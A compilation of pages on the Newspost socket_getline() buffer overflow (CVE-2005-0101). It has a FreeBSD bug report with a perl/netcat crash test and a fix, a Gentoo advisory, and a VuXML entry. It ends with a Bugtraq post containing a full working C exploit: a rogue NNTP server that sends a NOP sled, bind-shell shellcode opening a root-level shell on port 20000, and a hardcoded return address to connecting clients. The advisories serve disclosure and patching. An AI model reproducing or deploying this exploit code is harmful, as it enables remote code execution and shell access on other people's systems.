=== Content from people.freebsd.org_38a983c6_20250125_192201.html ===
Bug description:
----------------
An overflow exists in the socket\_getline() function. This function
reads a string from the socket into a given array and is used by
the nntp\_get\_response function.
The problem code is:
while (TRUE) {
retval = read(sockfd, pi, 1);
if(retval < 0)
ui\_socket\_error(errno);
read\_count += retval;
pi++;
if (buffer[i] == '\n')
break;
i++;
}
The pi array is the buffer and data is read into it until a '\n'
is received. So to overflow the buffer one has to provide a long
string without newline characters.
Testing the overflow:
---------------------
Create a server:
perl -e 'print "A" x 1024;print "BBBBCCCCDDDDEEEE"'| nc -v -l -p 119
Connect to it:
newspost -s test -i localhost -f me@me.nl -n news.news /etc/hosts
Break the connection by ^C'ing the netcat and you will see that
newspost segfaults immediately.
Fix for the problem:
--------------------
A rather simple fix would be to apply the patch below. It does the
job because all buffers handed to the socket\_getline function are
STRING\_BUFSIZE big.
--- base/socket.c.orig Tue Jan 18 11:08:02 2005
+++ base/socket.c Tue Jan 18 11:10:08 2005
@@ -126,7 +126,7 @@
i = 0;
pi = buffer;
- while (TRUE) {
+ while (read\_count < STRING\_BUFSIZE - 1) {
retval = read(sockfd, pi, 1);
if(retval < 0)
ui\_socket\_error(errno);


=== Content from security.gentoo.org_83ee619c_20250125_192201.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Newspost: Buffer overflow vulnerability — GLSA **200502-05**

A buffer overflow can be exploited to crash Newspost remotely and
potentially execute arbitrary code.

### Affected packages

| Package | **net-nntp/newspost** on all architectures |
| --- | --- |
| Affected versions | < **2.1.1-r1** |
| Unaffected versions | revision >= **2.0-r1**>= **2.1.1-r1** |

### Background

Newspost is a Usenet News binary autoposter.

### Description

Niels Heinen has discovered a buffer overflow in the socket\_getline()
function of Newspost, which can be triggered by providing long strings
that do not end with a newline character.

### Impact

A remote attacker could setup a malicious NNTP server and entice a
Newspost user to post to it, leading to the crash of the Newspost
process and potentially the execution of arbitrary code with the rights
of the Newspost user.

### Workaround

There is no known workaround at this time.

### Resolution

All Newspost users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-nntp/newspost-2.0-r1"
```
### References

* [CAN-2005-0101](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2005-0101)

**Release date**

February 03, 2005

**Latest revision**

February 21, 2005: 02

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [78530](https://bugs.gentoo.org/show_bug.cgi?id=78530)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.vuxml.org_66aa0fc0_20250125_192202.html ===

[FreeBSD
VuXML: Documenting security issues in FreeBSD and the
FreeBSD Ports Collection](./)
# newspost -- server response buffer overflow vulnerability

| | Affected packages | | | | | | --- | --- | --- | --- | --- | |  |  | [newspost](pkg-newspost.html) | <= | 2.1.1 | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

## Details

| VuXML ID | 7f13607b-6948-11d9-8937-00065be4b5b6 |
| --- | --- |
| Discovery | 2005-01-14 |
| Entry | 2005-02-01 |

The newspost program uses a function named socket\_getline to read
server responses from the network socket. Unfortunately this function
does not check the length of the buffer in which the read data is stored
and only stops reading when a newline character is found.

A malicious NNTP server could use this bug to cause a buffer overflow
by sending an overly long response. Such an overflow allows arbitrary
code to be executed, with the privileges of the newspost process, on the
affected systems.

## References

| CVE Name | CVE-2005-0101 |
| --- | --- |
| URL | <http://people.freebsd.org/~niels/issues/newspost-20050114.txt> |

---

Copyright © 2003-2005 [Jacques Vidrine and contributors](contributors.html).

Please see the source of this document for full copyright
information.



=== Content from marc.info_b39c9535_20250125_192200.html ===

```
[[prev in list](?l=bugtraq&m=110739082429973&w=2)] [[next in list](?l=bugtraq&m=110746266431815&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    RE: SECURITEY.NNOV.RU NewsPost buffer overflow [EXPLOIT]
From:       [<cybertronic () gmx ! net>](?a=110383072900004&r=1&w=2)
Date:       [2005-02-03 0:04:54](?l=bugtraq&r=1&w=2&b=200502)
Message-ID: [20050203000454.3746.qmail () www ! securityfocus ! com](?i=20050203000454.3746.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=110746336728781&q=mbox) or [body](?l=bugtraq&m=110746336728781&q=raw)]

/*
02/03/2005
NOTES: -Newspost "socket_getline()" Buffer Overflow
Exploit

Client Usage
------------
cybertronic:~/newspost-2.1> ./newspost -i <IP> -n
cyber -s tronic <file>

Greetz fly to my girlfriend YASMIN H.

                                                    ?
                                                   ?M
                   M
?MMM
                   MMm
?MMMM
                   M$$MMm
?MMMMM.
                   MM$$MMMMm
MMMMMMMM
                   `MM$$MMMMMMm               4MMMM$
$MM
                    MMM$$MMMMMMMMm           ?MMMM$
$MMM
                     MMM$$$MMMMMMMMm         mMMMM
$MMMM
                      `MMM$$$MMMMMMMm        MMMM
$MMMM?
                        MMMM$$$MMMMMMMm      MMM$
$MMM?
                         `MMMMMMMMMMMMMm     MMMMMMM?
                           `MMMMMMMMMMMMMm   MMMMMM
                              `MMMMMMMMMMMM  MMMMM
                                 `MMMMMMMMMM MMMMM
                                    `MMMMMMMMMMMM
                                      MMMMMMMMMMM
                               mmMMMMMMMMMMMMMMMMM
                           mmMMMMMMMMMMMMMMMMMMMMMM
                          ?MMM#MMMMMMMMMMMMMMMMMMMMm
                        4MMM<º >MMMMMMMMMMMMMMMMMMMM
                       MMMMMm_ mMMMMMMMMMMMMMMMMMMMM
                      4MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                       MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                       MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                        MMMMMMMMMMMMMMMMMMMMMMMMMMMM
       ?Mn               ?MMMMMMMMMMMMMMMMMMMMMMMMM
?Mnn
       nM                  `MMMMMMMMMMMMMMMMMMMMMM?
n?
        `?                    MMMMMMMMMMMMMMMMM?
n?
                                     MMMMMM?
                                    mtr?

     mMMM           nmM                         mM
   mM??  M          ' M                          n
 mM$                 nM                       n?MMn?Ä
4M               m   ?M                      N   ?
?`
m?       `n?    mM  NM?                         NM
mM        mMm  nm   M??MÄ?     n?Mm   ?n  xnÄ,  ?
?n  xnÄ  ?Mm   Mn n?     nM   nMm
 mM        `mMM?   nM     M   nM  ,`   ?n?  y   M
?n?  y nM  ?   nM  Ä    Ä   ?
  M?         M'    ?Ä      M  n.,?     nm      nM
nM     n   M   ?   Ä    ?  n
   MM?  mM   M    nM Ä    M?  n    ,  nM       ?Ä
nM      M  nM   M   M   M?  M   n
     MMM?   M?   nM   MÄÄM     n?nN  ?M       nM   ?M
`?M?   ??  .N  nM    ?nM?
           M?
         n?
cybertronic 2oo5
        ?
________________
                                                    ----------------------/

                MMMMMMMMm
mMMMMMMM?
             ?MM$MMMMMMMMMm
mMMMMMMMMM$MM`
             MMMMMMMMMMMMMMMm
mMMMMMMMMMMMMMMM
             MMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMM
             MMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMM
               `MMMMMMMMMMMMMMMMMM
MMMMMMMMMMM(c)MMMM?

                ºÕÍÄúú  just want to say love you
dad!  úúÄÍÕº
*/

#include <stdio.h>
#include <strings.h>
#include <signal.h>
#include <netinet/in.h>
#include <netdb.h>

#define RED	"\E[31m\E[1m"
#define GREEN	"\E[32m\E[1m"
#define YELLOW	"\E[33m\E[1m"
#define BLUE	"\E[34m\E[1m"
#define NORMAL	"\E[m"

#define PORT	119
#define BACKLOG 5

//92 bytes bindcode port 20000
char scode[] =
"\x31\xdb"				// xor
ebx, ebx
"\xf7\xe3"				// mul
ebx
"\xb0\x66"				// mov
al, 102
"\x53"					// push
ebx
"\x43"					// inc
ebx
"\x53"					// push
ebx
"\x43"					// inc
ebx
"\x53"					// push
ebx
"\x89\xe1"				// mov
ecx, esp
"\x4b"					// dec
ebx
"\xcd\x80"				// int
80h
"\x89\xc7"				// mov
edi, eax
"\x52"					// push
edx
"\x66\x68\x4e\x20"			// push
word 8270
"\x43"					// inc
ebx
"\x66\x53"				// push    bx
"\x89\xe1"				// mov
ecx, esp
"\xb0\xef"				// mov
al, 239
"\xf6\xd0"				// not	   al
"\x50"					// push
eax
"\x51"					// push
ecx
"\x57"					// push
edi
"\x89\xe1"				// mov
ecx, esp
"\xb0\x66"				// mov
al, 102
"\xcd\x80"				// int
80h
"\xb0\x66"				// mov
al, 102
"\x43"					// inc
ebx
"\x43"					// inc
ebx
"\xcd\x80"				// int
80h
"\x50"					// push
eax
"\x50"					// push
eax
"\x57"					// push
edi
"\x89\xe1"				// mov
ecx, esp
"\x43"					// inc
ebx
"\xb0\x66"				// mov
al, 102
"\xcd\x80"				// int
80h
"\x89\xd9"				// mov
ecx, ebx
"\x89\xc3"				// mov
ebx, eax
"\xb0\x3f"				// mov
al, 63
"\x49"					// dec
ecx
"\xcd\x80"				// int
80h
"\x41"					// inc
ecx
"\xe2\xf8"				// loop    lp
"\x51"					// push
ecx
"\x68\x6e\x2f\x73\x68"			// push
dword 68732f6eh
"\x68\x2f\x2f\x62\x69"			// push
dword 69622f2fh
"\x89\xe3"				// mov
ebx, esp
"\x51"					// push
ecx
"\x53"					// push
ebx
"\x89\xe1"				// mov
ecx, esp
"\xb0\xf4"				// mov
al, 244
"\xf6\xd0"				// not	   al
"\xcd\x80";				// int
80h

void cmd ( int connfd );
void header ();

int
main ( int argc, char* argv[] )
{
	int listenfd, connfd;
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in cliaddr, servaddr;

	header ();
	printf ( "[*] Creating socket..." );
	if ( ( listenfd = socket ( AF_INET,
SOCK_STREAM, 0 ) ) == -1 )
	{
        	printf ( RED "FAILED!\n" NORMAL );
        	exit ( 1 );
	}
	printf ( GREEN "OK!\n" NORMAL );
	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl
( INADDR_ANY );
	servaddr.sin_port = htons ( PORT );

	bind ( listenfd, ( struct sockaddr * )
&servaddr, sizeof ( servaddr ) );
	printf ( "[*] Listening..." );
	if ( listen ( listenfd, BACKLOG ) == -1 )
	{
		printf ( RED "FAILED!\n" NORMAL );
		exit ( 1 );
	}
	printf ( GREEN "OK!\n" NORMAL );

	for ( ; ; )
	{
		clilen = sizeof ( cliaddr );

		if ( ( connfd = accept ( listenfd,
( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
		{
			close ( listenfd );
			exit ( 1 );
		}

		if ( ( childpid = fork ( ) ) == 0 )
		{
			close ( listenfd );
			printf ( "[*]" GREEN "
Incomming connection from:\t %s\n" NORMAL, inet_ntoa
( cliaddr.sin_addr ) );
			cmd ( connfd );
		}
		close ( connfd );
	}
}

void
cmd ( int s )
{
	char in[1024], out[1200];
	unsigned long ret = 0xbfffecb8;

	bzero ( &out, 1200 );
	memset ( out, 0x90, 956 ); //956
	memcpy ( out + 956, scode, sizeof
( scode ) );
	strcat ( out, "\x41\x41\x41\x41" );
	strncat ( out, ( unsigned char* ) &ret, 4 );
	printf ( "[*] Sending Bad Packet [ %u
bytes ]...", strlen ( out ) );
	if ( write ( s, out, strlen ( out ) ) <= 0 )
	{
		printf ( RED "FAILED!\n" NORMAL);
		exit ( 1 );
	}
	printf ( GREEN "OK!\n" NORMAL);
	sleep ( 1 );
}

void
header ()
{
	system ( "clear" );
	printf ( RED "### " GREEN "# # " YELLOW "###
" BLUE "### " RED "###  " GREEN "### " YELLOW "###  "
BLUE "### " RED "#   # " GREEN "# " YELLOW "###\n"
NORMAL);
	printf ( RED "#   " GREEN "# # " YELLOW "#  #
" BLUE "#   " RED "#  # " GREEN " #  " YELLOW "#  # "
BLUE "# # " RED "##  # " GREEN "# " YELLOW "#  \n"
NORMAL);
	printf ( RED "#   " GREEN "# # " YELLOW "###
" BLUE "### " RED "###  " GREEN " #  " YELLOW "###  "
BLUE "# # " RED "# # # " GREEN "# " YELLOW "#  \n"
NORMAL);
	printf ( RED "#   " GREEN " #  " YELLOW "#  #
" BLUE "#   " RED "# #  " GREEN " #  " YELLOW "# #  "
BLUE "# # " RED "#  ## " GREEN "# " YELLOW "#  \n"
NORMAL);
	printf ( RED "### " GREEN " #  " YELLOW "###
" BLUE "### " RED "#  # " GREEN " #  " YELLOW "#  # "
BLUE "### " RED "#   # " GREEN "# " YELLOW "###\n"
NORMAL);
	printf ( RED "
cybertronic@gmx.net\n" NORMAL );
	printf ( RED "                  ----------(c)
2005----------\n\n" NORMAL );
	printf ( "newspost-2.1\n\n" );
}

[[prev in list](?l=bugtraq&m=110739082429973&w=2)] [[next in list](?l=bugtraq&m=110746266431815&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


